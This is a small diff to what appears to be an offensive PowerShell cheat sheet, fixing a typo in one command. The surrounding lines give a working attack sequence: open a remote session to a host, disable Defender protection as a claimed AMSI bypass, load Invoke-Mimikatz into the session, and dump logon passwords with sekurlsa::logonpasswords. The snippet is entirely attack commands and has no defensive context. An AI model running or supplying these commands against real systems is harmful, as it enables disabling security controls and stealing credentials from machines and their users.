@@ -342,7 +342,7 @@ $sess = New-PSSession -ComputerName host
 ##Bypass AMSI (if administrator)
 Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
 ##Load mimikatz
-Invoke-command - ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
 ##dump creds
 sekurlsa::logonpasswords
 ```
